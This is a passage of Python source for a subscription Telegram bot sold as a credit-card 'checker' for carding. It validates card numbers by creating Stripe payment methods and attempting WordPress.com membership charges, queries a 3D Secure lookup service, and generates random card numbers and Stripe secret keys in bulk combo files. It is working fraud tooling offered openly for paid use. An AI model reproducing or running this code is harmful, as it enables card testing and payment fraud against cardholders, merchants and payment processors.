𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$
𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		pp = message.reply_to_message.text
	except:
		pp=message.text
	pp=str(reg(pp))
	if pp == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(pp))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+pp[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>GNAZH 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='GNAZH-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 DAY  ➜ 1 𝑨𝑺𝑰𝑨
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 DAY  ➜  1$
1 𝑾𝑬𝑬𝑲 ➜  3$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:
 
𝑬𝑮𝒀𝑷𝑻 
1 DAY > 50𝑬G
1 𝑾𝑬𝑬𝑲 > 150𝑬G
1 𝑴𝑶𝑵𝑻𝑯 > 450𝑬𝑮

𝑰𝑹𝑨𝑸 
1 𝑾𝑬𝑬𝑲 ➜  3 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜  10 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜  𝑼𝑺𝑫𝑻 
1 𝑾𝑬𝑬𝑲 ➜  3$
1 𝑴𝑶𝑵𝑻𝑯 ➜  10$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/GNA_I")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		pp = message.reply_to_message.text
	except:
		pp=message.text
	pp=str(reg(pp))
	if pp == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		response = requests.post(
		f'https://rimuruchkbot.alwaysdata.net/vbv.php?bin={pp}')
		last=(response.json()['result'])
		if 'result not found' in last:
			last='Authenticate Frictionless Failed'
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+pp[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝙋𝙖𝙨𝙨𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
	msgd=f'''<b>𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌
			
𝘾𝙖𝙧𝙙 ➼ <code>{pp}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {pp[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @GNA_I</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("تم تشغيل البوت" 
 )
def gen_markup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 4
    markup.add(InlineKeyboardButton("⌯ Generate ", callback_data="gen"))
    return markup
    
@bot.message_handler(func=lambda message:True)
def main_bot(message):
	keyboard = telebot.types.InlineKeyboardMarkup()
	keyboard.add(
       telebot.types.InlineKeyboardButton(
           'BOT CHANNEL UPDATES', url='t.me/G_N_A_Z_H'
       )
          )
	num='0987654321'
	msg=message.text
	user=message.from_user.username
	user_id=message.from_user.id
	cd_1='/gen '
	cd_2='/combo '
	cd_3='/sk '
	cd_4='/skcombo'
	cd_5='/bin '
	cd_6='/pp '

	if cd_1 in msg:
		len_bin=len(msg.split(cd_1)[1])
		bin=(msg.split(cd_1)[1])
		len_card=16-len_bin
		list=[]
		month=['01', '02', '03', '04', '05', '06', '07', '08', '10', '11', '12']
		year=['24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39']		
		p=0
		
		for i in range(10):
			mm=random.choice(month)
			yy=random.choice(year)
			cvv=str(''.join(random.choice(num)for i in range(3)))
			rand1=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
			list.append(rand1)
			for x in range(1):
				mm=random.choice(month)
				yy=random.choice(year)
				cvv=str(''.join(random.choice(num)for i in range(3)))				
				rand2=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
				list.append(rand2)
				for xx in range(1):
					mm=random.choice(month)
					yy=random.choice(year)
					cvv=str(''.join(random.choice(num)for i in range(3)))	
					rand3=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
					list.append(rand2)
					for xc in range(1):
						
						mm=random.choice(month)
						yy=random.choice(year)
						cvv=str(''.join(random.choice(num)for i in range(3)))	
						rand4=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
						list.append(rand4)
						for xxx in range(1):
							
							mm=random.choice(month)
							yy=random.choice(year)
							cvv=str(''.join(random.choice(num)for i in range(3)))	
							rand5=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
							list.append(rand5)
							for g in range(5):
								mm=random.choice(month)
								yy=random.choice(year)
								cvv=str(''.join(random.choice(num)for i in range(3)))
								rand6=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
								list.append(rand6)
								while len(list)==10:
									c0=list[0]
									c1=list[1]
									c2=list[2]
									c3=list[3]
									c4=list[4]
									c5=list[5]
									c6=list[6]
									c7=list[7]
									c8=list[8]
									c9=list[9]
									if c9:
										bot.reply_to(message,f'''
<strong> Random Cards ✅
━━━━━━━━━━━━━</strong>\n
<code>{c0}</code>\n
<code>{c1}</code>\n
<code>{c2}</code>\n
<code>{c3}</code>\n
<code>{c4}</code>\n
<code>{c5}</code>\n
<code>{c6}</code>\n
<code>{c7}</code>\n
<code>{c8}</code>\n
<code>{c9}</code>\n
<strong>━━━━━━━━━━━━━
⌯ Bot by :  <a href='https://t.me/GNA_I'>GNA_I</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html', disable_web_page_preview=True
		)
										break
										
											
	
		
	elif cd_2 in msg:
		try:
			os.mkdir('/storage/emulated/0/pp')
		except:pass
		msg=message.text
		len_bin=len(msg.split(cd_2)[1])
		bin=msg.split(cd_2)[1]
		len_card=16-len_bin
		comb=[]
		v=0
		month=['01', '02', '03', '04', '05', '06', '07', '08', '10', '11', '12']
		year=['23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39']
		pp='combo-pp'
		path=random.choice(month)+random.choice(year)+random.choice(pp)+pp+'.txt'
		while True:
			mm=random.choice(month)
			yy=random.choice(year)
			cvv=str(''.join(random.choice(num)for i in range(3)))
			card=bin+str(''.join(random.choice(num)for i in range(len_card)))+'|'+mm+'|'+yy+'|'+cvv
			comb.append(card)
			cwd = os.getcwd()
			os.chdir(r"/storage/emulated/0/pp")
			l = open(path,'a+')
			l.write(card+"\n")
			v+=1
			l.close()
			if v == 400:
								time.sleep(3)
								os.chdir(r"/storage/emulated/0/pp")
								xx=open(path,'r')
								with open(path, 'r') as file:
									lines = 0
									for line in file:
									  lines += 1
								   
								bot.send_document(message.chat.id,xx,caption=f'<strong>DONE ✅\nBin : {bin} \nCount : {lines}</strong>',reply_markup=keyboard,parse_mode='html')
								os.system(f'rm -rf {path}')
								break
	
								
	elif cd_3 in msg:
		try:
			msg=message.text
			sk='sk_live_'+msg.split('sk_live_')[1]
			url1='https://ccxen.eu.org/v1/api/sk.php?sk='+sk
			req=requests.get(url1).text
			if 'DEAD' in req:
				
				bot.reply_to(message,f'''
<strong>DEAD SK ❌
━━━━━━━━━━━━━</strong>\n
<code>{sk}</code>\n
<strong>━━━━━━━━━━━━━
⌯ by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html', disable_web_page_preview=True
		)
			else:
				bot.reply_to(message,f'''
<strong>LIVE SK ✅
━━━━━━━━━━━━━</strong>\n
<code>{sk}</code>\n
<strong>━━━━━━━━━━━━━
⌯ by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html', disable_web_page_preview=True
		)
		
			
		except Exception as error:
			
			print(error)
			bot.reply_to(message,f'''
<strong> ERROR / TryAgin ⚠️
━━━━━━━━━━━━━</strong>\n
<code>{sk}</code>\n
<strong>━━━━━━━━━━━━━
⌯ by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html', disable_web_page_preview=True
		)
		
	elif cd_4 in msg:
		try:
			os.mkdir('/storage/emulated/0/sks')
		except:pass
		sklist=[]
		pp='sklist'
		v=0
		path=random.choice('1221464684')+random.choice('122545484')+random.choice('1221464684')+random.choice('122545484')+random.choice(pp)+pp+'.txt'
		while True:
			ln="51HjhvpHJcZaFiVNWse203Mf3aOwYakUdm1VwJpCdSQcJHwXfazxZ5yySPumygYaMfxiRTCGRph4yjamXXb8RfdNE00to0noaTY"
			n='QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm12345678912345678901234567890'
			sk='sk_live_'+str(''.join(random.choice(n)for i in range(len(ln))))
			sklist.append(sk)
			cwd = os.getcwd()
			os.chdir(r"/storage/emulated/0/sks")
			l = open(path,'a+')
			l.write(sk+"\n")
			v+=1
			l.close()
			if v == 400:
				time.sleep(3)
				os.chdir(r"/storage/emulated/0/sks")
				xx=open(path,'r')
				bot.send_document(message.chat.id,xx,caption=f'<strong>DONE ✅</strong>',reply_markup=keyboard,parse_mode='html')
				os.system(f'rm -rf {path}')
				break
		
		
		
	elif cd_5 in msg:
		try:
				bn=msg.split(cd_5)[1]
				pp=requests.get(f'https://lookup.binlist.net/{bn}').text
				js=json.loads(pp)
				bank=js['bank']
				brand=js['brand']
				cur=js['country']['currency']
				em=js['country']['emoji']
				sc=js['scheme']
				type=js['type']
				bot.reply_to(message,f'''
<strong>Valid Bin ✅
━━━━━━━━━━━━━
- Bin : <code>{bn}</code>
- Type : {type} - {sc} - {brand}
- Country : {em}
- Bank : {bank}
- Currency : {cur}
- Flag : {em}
━━━━━━━━━━━━━
⌯ by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html',disable_web_page_preview=True)
			
		except Exception as error:
			print(error)
			bot.reply_to(message,f'''
<strong> ERROR IN CHECK ⚠️
━━━━━━━━━━━━━\n
- BIN : </strong><code>{bn}</code>\n
<strong>━━━━━━━━━━━━━
⌯ by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html', disable_web_page_preview=True
		)
	elif cd_6 in msg:
		try:
				card=msg.split(cd_6)[1]
				pp=card.split('|')[0]
				mm=card.split('|')[1] 
				yy=card.split('|')[2]
				cvv=card.split('|')[3]
				bn=card[:6]
				pp=requests.get(f'https://lookup.binlist.net/{bn}').text
				js=json.loads(pp)
				bank=js['bank']['name']
				brand=js['brand']
				cur=js['country']['currency']
				em=js['country']['emoji']
				sc=js['scheme']
				type=js['type']
				f_name=names.get_first_name()
				l_name=names.get_last_name()
				d=f"type=card&billing_details[name]={f_name}+{f_name}&card[number]={pp}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2c266ddfa7%3B+stripe-js-v3%2F2c266ddfa7&time_on_page=27250&key=pk_live_5KKxLKPPzzvzFSiQlUskSRhr"

				dd = {"User-Agent": 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7'}
				r = requests.post(f"https://api.stripe.com/v1/payment_methods", headers=dd,data=d).json()['id']
				hh={'cookie':'tk_aiin9Vh0IWbw7I7zU%2FGwVyRfWU','referer':'https://public-api.wordpress.com/wp-admin/rest-proxy/','user-agent':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7','x-requested-with':'mark.via.gp','origin':'https://public-api.wordpress.com','content-type':'application/json','Host':'public-api.wordpress.com','accept-language':'en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6','accept-encoding':'gzip, deflate','sec-fetch-dest':'empty','sec-fetch-mode':'cors','accept':'*/*'}
				dr='{'+'"plan_id":"2164"'+',"email":"jjeje@gmail.com","stripe_payment_method":"'+r+'","amount":1,"tracks":"in9Vh0IWbw7I7zU/GwVyRfWU"'+'}'
				re = requests.post(f"https://public-api.wordpress.com/rest/v1/sites/136816893/memberships/subscribe?http_envelope=1",headers=hh,data=dr).text
				jso=json.loads(re)
				
				if "'livemode': True" in re:
					suc=f'''<strong> Live Card ✅━━━━━━━━━━━━━
- Status : Approved ✅✅✅\n
- Card : <code>{card}</code>\n
- Gateway: Stripe Gateway v1\n
 [ Card Details ✅ ]
━━━━━━━━━━━━━
- Bin : <code>{bn}</code>\n
- Type : {type} - {sc} - {brand}\n
- Country : {em}\n
- Bank : {bank}\n
- Currency : {cur}\n
━━━━━━━━━━━━━
⌯ Checked by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
'''
					bot.reply_to(message,suc,reply_markup=keyboard,parse_mode='html',disable_web_page_preview=True)
				else:
					res=jso['body']['message']
					bot.reply_to(message,f'''
<strong> Dead card ❌
━━━━━━━━━━━━━
- Card : <code>{card}</code>\n
- Status : Declined ❌\n
- Response : {res}
- Gateway: Stripe Gateway v1
━━━━━━━━━━━━━
⌯ Checked by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html',disable_web_page_preview=True
		)
		
		except Exception as error:
			print(error)
			bot.reply_to(message,f'''
<strong> Error / Try again ⚠️
━━━━━━━━━━━━━
- Card : <code>{card}</code>\n
- Status : Error ⚠️\n
- Response : Error in payment process,
- Gateway: Stripe Gateway v1\n
━━━━━━━━━━━━━
⌯ Checked by :  <a href='https://t.me/GNA_I'>𝑮 𝑵 𝑨 𝒁 𝑯</a>
</strong>
''',
		reply_markup=keyboard,
		parse_mode='html',disable_web_page_preview=True
		)
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطا: {e}")